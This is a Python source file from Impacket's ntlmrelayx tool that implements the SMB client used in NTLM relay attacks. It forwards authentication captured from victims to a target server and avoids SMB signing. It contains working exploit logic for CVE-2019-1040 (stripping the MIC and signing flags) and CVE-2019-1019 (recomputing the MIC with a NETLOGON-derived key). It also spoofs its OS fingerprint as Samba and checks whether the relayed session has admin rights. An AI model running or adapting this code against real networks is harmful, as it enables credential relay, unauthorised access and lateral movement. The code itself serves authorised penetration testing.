# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SMB Relay Protocol Client
#   This is the SMB client which initiates the connection to an
#   SMB server and relays the credentials to this server.
#
# Author:
#   Alberto Solino (@agsolino)
#

import logging
import os

from binascii import unhexlify, hexlify
from struct import unpack, pack
from socket import error as socketerror
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NULL
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.examples.ntlmrelayx.servers.socksserver import KEEP_ALIVE_TIMER
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_LOGON_FAILURE
from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge, NTLMAuthChallengeResponse, \
    generateEncryptedSessionKey, hmac_md5
from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
    SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
    SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Parameters
from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCARD, SMB2Negotiate_Response, \
    SMB2_NEGOTIATE, SMB2Negotiate, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30, SMB2_GLOBAL_CAP_LEASING, \
    SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
    SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
from impacket.smbconnection import SMBConnection, SMB_DIALECT
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.dcerpc.v5 import scmr

PROTOCOL_CLIENT_CLASS = "SMBRelayClient"

class MYSMB(SMB):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None):
        self.extendedSecurity = extendedSecurity
        SMB.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negPacket=negPacket)

    def neg_session(self, negPacket=None):
        return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)

class MYSMB3(SMB3):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None):
        self.extendedSecurity = extendedSecurity
        SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)

    def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
        # We DON'T want to sign
        self._Connection['ClientSecurityMode'] = 0

        if self.RequireMessageSigning is True:
            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
            return

        self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
        currentDialect = SMB2_DIALECT_WILDCARD

        # Do we have a negSessionPacket already?
        if negSessionResponse is not None:
            # Yes, let's store the dialect answered back
            negResp = SMB2Negotiate_Response(negSessionResponse['Data'])
            currentDialect = negResp['DialectRevision']

        if currentDialect == SMB2_DIALECT_WILDCARD:
            # Still don't know the chosen dialect, let's send our options

            packet = self.SMB_PACKET()
            packet['Command'] = SMB2_NEGOTIATE
            negSession = SMB2Negotiate()

            negSession['SecurityMode'] = self._Connection['ClientSecurityMode']
            negSession['Capabilities'] = self._Connection['Capabilities']
            negSession['ClientGuid'] = self.ClientGuid
            if preferredDialect is not None:
                negSession['Dialects'] = [preferredDialect]
            else:
                negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]
            negSession['DialectCount'] = len(negSession['Dialects'])
            packet['Data'] = negSession

            packetID = self.sendSMB(packet)
            ans = self.recvSMB(packetID)
            if ans.isValidAnswer(STATUS_SUCCESS):
                negResp = SMB2Negotiate_Response(ans['Data'])

        self._Connection['MaxTransactSize']   = min(0x100000,negResp['MaxTransactSize'])
        self._Connection['MaxReadSize']       = min(0x100000,negResp['MaxReadSize'])
        self._Connection['MaxWriteSize']      = min(0x100000,negResp['MaxWriteSize'])
        self._Connection['ServerGuid']        = negResp['ServerGuid']
        self._Connection['GSSNegotiateToken'] = negResp['Buffer']
        self._Connection['Dialect']           = negResp['DialectRevision']
        if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
            return
        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
            self._Connection['SupportsFileLeasing'] = True
        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU) == SMB2_GLOBAL_CAP_LARGE_MTU:
            self._Connection['SupportsMultiCredit'] = True

        if self._Connection['Dialect'] == SMB2_DIALECT_30:
            # Switching to the right packet format
            self.SMB_PACKET = SMB3Packet
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_DIRECTORY_LEASING) == SMB2_GLOBAL_CAP_DIRECTORY_LEASING:
                self._Connection['SupportsDirectoryLeasing'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_MULTI_CHANNEL) == SMB2_GLOBAL_CAP_MULTI_CHANNEL:
                self._Connection['SupportsMultiChannel'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_PERSISTENT_HANDLES) == SMB2_GLOBAL_CAP_PERSISTENT_HANDLES:
                self._Connection['SupportsPersistentHandles'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION) == SMB2_GLOBAL_CAP_ENCRYPTION:
                self._Connection['SupportsEncryption'] = True

            self._Connection['ServerCapabilities'] = negResp['Capabilities']
            self._Connection['ServerSecurityMode'] = negResp['SecurityMode']

class SMBRelayClient(ProtocolClient):
    PLUGIN_NAME = "SMB"
    def __init__(self, serverConfig, target, targetPort = 445, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity

        self.machineAccount = None
        self.machineHashes = None
        self.sessionData = {}

        self.negotiateMessage = None
        self.challengeMessage = None
        self.serverChallenge = None

        self.keepAliveHits = 1

    def netlogonSessionKey(self, authenticateMessageBlob):
        # Here we will use netlogon to get the signing session key
        logging.info("Connecting to %s NETLOGON service" % self.serverConfig.domainIp)

        #respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
        authenticateMessage = NTLMAuthChallengeResponse()
        authenticateMessage.fromString(authenticateMessageBlob)
        _, machineAccount = self.serverConfig.machineAccount.split('/')
        domainName = authenticateMessage['domain_name'].decode('utf-16le')

        try:
            serverName = machineAccount[:len(machineAccount)-1]
        except:
            # We're in NTLMv1, not supported
            return STATUS_ACCESS_DENIED

        stringBinding = r'ncacn_np:%s[\PIPE\netlogon]' % self.serverConfig.domainIp

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if len(self.serverConfig.machineHashes) > 0:
            lmhash, nthash = self.serverConfig.machineHashes.split(':')
        else:
            lmhash = ''
            nthash = ''

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(machineAccount, '', domainName, lmhash, nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', b'12345678')

        serverChallenge = resp['ServerChallenge']

        if self.serverConfig.machineHashes == '':
            ntHash = None
        else:
            ntHash = unhexlify(self.serverConfig.machineHashes.split(':')[1])

        sessionKey = nrpc.ComputeSessionKeyStrongKey('', b'12345678', serverChallenge, ntHash)

        ppp = nrpc.ComputeNetlogonCredential(b'12345678', sessionKey)

        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00',
                                      ppp, 0x600FFFFF)

        clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)

        # Now let's try to verify the security blob against the PDC

        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = '\x00'
        request['ComputerName'] = serverName + '\x00'
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4

        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage[
            'user_name'].decode('utf-16le')
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = self.serverChallenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']

        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
        authenticator['Timestamp'] = 10

        request['Authenticator'] = authenticator
        request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0
        # request.dump()
        try:
            resp = dce.request(request)
            # resp.dump()
        except DCERPCException as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            return e.get_error_code()

        logging.info("%s\\%s successfully validated through NETLOGON" % (
            domainName, authenticateMessage['user_name'].decode('utf-16le')))

        encryptedSessionKey = authenticateMessage['session_key']
        if encryptedSessionKey != b'':
            signingKey = generateEncryptedSessionKey(
                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
        else:
            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']

        logging.info("SMB Signing key: %s " % hexlify(signingKey).decode('utf-8'))

        return STATUS_SUCCESS, signingKey

    def keepAlive(self):
        # SMB Keep Alive more or less every 5 minutes
        if self.keepAliveHits >= (250 / KEEP_ALIVE_TIMER):
            # Time to send a packet
            # Just a tree connect / disconnect to avoid the session timeout
            tid = self.session.connectTree('IPC$')
            self.session.disconnectTree(tid)
            self.keepAliveHits = 1
        else:
            self.keepAliveHits +=1

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def initConnection(self):
        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort, manualNegotiate=True)
                                     #,preferredDialect=SMB_DIALECT)
        if self.serverConfig.smb2support is True:
            data = '\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
        else:
            data = '\x02NT LM 0.12\x00'

        if self.extendedSecurity is True:
            flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        else:
            flags2 = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        try:
            packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity,
                                                  flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS,
                             flags2=flags2, data=data)
        except Exception as e:
            if not self.serverConfig.smb2support:
                LOG.error('SMBClient error: Connection was reset. Possibly the target has SMBv1 disabled. Try running ntlmrelayx with -smb2support')
            else:
                LOG.error('SMBClient error: Connection was reset')
            return False
        if packet[0:1] == b'\xfe':
            preferredDialect = None
            # Currently only works with SMB2_DIALECT_002 or SMB2_DIALECT_21
            if self.serverConfig.remove_target:
                preferredDialect = SMB2_DIALECT_21
            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
                               negPacket=packet, preferredDialect=preferredDialect)
        else:
            # Answer is SMB packet, sticking to SMBv1
            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
                              negPacket=packet)

        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
                                     existingConnection=smbClient, manualNegotiate=True)

        return True

    def setUid(self,uid):
        self._uid = uid

    def sendNegotiate(self, negotiateMessage):
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)
        # When exploiting CVE-2019-1040, remove flags
        if self.serverConfig.remove_mic:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION

        negotiateMessage = negoMessage.getData()

        challenge = NTLMAuthChallenge()
        if self.session.getDialect() == SMB_DIALECT:
            challenge.fromString(self.sendNegotiatev1(negotiateMessage))
        else:
            challenge.fromString(self.sendNegotiatev2(negotiateMessage))

        self.negotiateMessage = negotiateMessage
        self.challengeMessage = challenge.getData()

        # Store the Challenge in our session data dict. It will be used by the SMB Proxy
        self.sessionData['CHALLENGE_MESSAGE'] = challenge
        self.serverChallenge = challenge['challenge']

        return challenge

    def sendNegotiatev2(self, negotiateMessage):
        v2client = self.session.getSMBServer()

        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0

        sessionSetup['SecurityBufferLength'] = len(negotiateMessage)
        sessionSetup['Buffer'] = negotiateMessage

        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data'] = sessionSetup

        packetID = v2client.sendSMB(packet)
        ans = v2client.recvSMB(packetID)
        if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
            v2client._Session['SessionID'] = ans['SessionID']
            sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
            return sessionSetupResponse['Buffer']

        return False

    def sendNegotiatev1(self, negotiateMessage):
        v1client = self.session.getSMBServer()

        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
        # Are we required to sign SMB? If so we do it, if not we skip it
        if v1client.is_signing_required():
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE

        # Just in case, clear the Unicode Flag
        flags2 = v1client.get_flags ()[1]
        v1client.set_flags(flags2=flags2 & (~SMB.FLAGS2_UNICODE))

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        #blob = SPNEGO_NegTokenInit()

        # NTLMSSP
        #blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        #blob['MechToken'] = negotiateMessage

        #sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters']['SecurityBlobLength']  = len(negotiateMessage)
        sessionSetup['Parameters'].getData()
        #sessionSetup['Data']['SecurityBlob'] = blob.getData()
        sessionSetup['Data']['SecurityBlob'] = negotiateMessage

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)
        smb = v1client.recvSMB()

        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except Exception:
            LOG.error("SessionSetup Error!")
            raise
        else:
            # We will need to use this uid field for all future requests/responses
            v1client.set_uid(smb['Uid'])

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            #respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])

            #return respToken['ResponseToken']
            return sessionData['SecurityBlob']

    def sendStandardSecurityAuth(self, sessionSetupData):
        v1client = self.session.getSMBServer()
        flags2 = v1client.get_flags()[1]
        v1client.set_flags(flags2=flags2 & (~SMB.FLAGS2_EXTENDED_SECURITY))
        if sessionSetupData['Account'] != '':
            smb = NewSMBPacket()
            smb['Flags1'] = 8

            sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
            sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
            sessionSetup['Data'] = SMBSessionSetupAndX_Data()

            sessionSetup['Parameters']['MaxBuffer'] = 65535
            sessionSetup['Parameters']['MaxMpxCount'] = 2
            sessionSetup['Parameters']['VCNumber'] = os.getpid()
            sessionSetup['Parameters']['SessionKey'] = v1client._dialects_parameters['SessionKey']
            sessionSetup['Parameters']['AnsiPwdLength'] = len(sessionSetupData['AnsiPwd'])
            sessionSetup['Parameters']['UnicodePwdLength'] = len(sessionSetupData['UnicodePwd'])
            sessionSetup['Parameters']['Capabilities'] = SMB.CAP_RAW_MODE

            sessionSetup['Data']['AnsiPwd'] = sessionSetupData['AnsiPwd']
            sessionSetup['Data']['UnicodePwd'] = sessionSetupData['UnicodePwd']
            sessionSetup['Data']['Account'] = sessionSetupData['Account']
            sessionSetup['Data']['PrimaryDomain'] = sessionSetupData['PrimaryDomain']
            sessionSetup['Data']['NativeOS'] = 'Unix'
            sessionSetup['Data']['NativeLanMan'] = 'Samba'

            smb.addCommand(sessionSetup)

            v1client.sendSMB(smb)
            smb = v1client.recvSMB()
            try:
                smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
            except:
                return None, STATUS_LOGON_FAILURE
            else:
                v1client.set_uid(smb['Uid'])
                return smb, STATUS_SUCCESS
        else:
            # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
            clientResponse = None
            errorCode = STATUS_ACCESS_DENIED

        return clientResponse, errorCode

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):

        # When exploiting CVE-2019-1040, remove flags
        if self.serverConfig.remove_mic:
            authMessage = NTLMAuthChallengeResponse()
            authMessage.fromString(authenticateMessageBlob)
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            authenticateMessageBlob = authMessage.getData()

        #if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
        #    # We need to unwrap SPNEGO and get the NTLMSSP
        #    respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
        #    authData = respToken['ResponseToken']
        #else:
        authData = authenticateMessageBlob

        signingKey = None
        if self.serverConfig.remove_target:
            # Trying to exploit CVE-2019-1019
            # Discovery and Implementation by @simakov_marina and @YaronZi
            # respToken2 = SPNEGO_NegTokenResp(authData)
            authenticateMessageBlob = authData

            errorCode, signingKey = self.netlogonSessionKey(authData)

            # Recalculate MIC
            res = NTLMAuthChallengeResponse()
            res.fromString(authenticateMessageBlob)

            newAuthBlob = authenticateMessageBlob[0:0x48] + b'\x00'*16 + authenticateMessageBlob[0x58:]
            relay_MIC = hmac_md5(signingKey, self.negotiateMessage + self.challengeMessage + newAuthBlob)

            respToken2 = SPNEGO_NegTokenResp()
            respToken2['ResponseToken'] = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
            authData = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
            #authData = respToken2.getData()

        if self.session.getDialect() == SMB_DIALECT:
            token, errorCode = self.sendAuthv1(authData, serverChallenge)
        else:
            token, errorCode = self.sendAuthv2(authData, serverChallenge)

        if signingKey:
            logging.info("Enabling session signing")
            self.session._SMBConnection.set_session_key(signingKey)

        return token, errorCode

    def sendAuthv2(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            # We need to unwrap SPNEGO and get the NTLMSSP
            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
            authData = respToken['ResponseToken']
        else:
            authData = authenticateMessageBlob

        v2client = self.session.getSMBServer()

        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0

        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data']    = sessionSetup

        # Reusing the previous structure
        sessionSetup['SecurityBufferLength'] = len(authData)
        sessionSetup['Buffer'] = authData

        packetID = v2client.sendSMB(packet)
        packet = v2client.recvSMB(packetID)

        return packet, packet['Status']

    def sendAuthv1(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            # We need to unwrap SPNEGO and get the NTLMSSP
            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
            authData = respToken['ResponseToken']
        else:
            authData = authenticateMessageBlob

        v1client = self.session.getSMBServer()

        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_UNICODE
        # Are we required to sign SMB? If so we do it, if not we skip it
        if v1client.is_signing_required():
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = v1client.get_uid()

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        sessionSetup['Parameters']['SecurityBlobLength'] = len(authData)
        sessionSetup['Data']['SecurityBlob'] = authData
        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)

        smb = v1client.recvSMB()

        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']

        return smb, errorCode

    def getStandardSecurityChallenge(self):
        if self.session.getDialect() == SMB_DIALECT:
            return self.session.getSMBServer().get_encryption_key()
        else:
            return None

    def isAdmin(self):
        rpctransport = SMBTransport(self.session.getRemoteHost(), 445, r'\svcctl', smb_connection=self.session)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except:
            pass
        else:
            dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                ans = scmr.hROpenSCManagerW(dce,'{}\x00'.format(self.target.hostname),'ServicesActive\x00', 0xF003F)
                return "TRUE"
            except scmr.DCERPCException as e:
                pass
        return "FALSE"
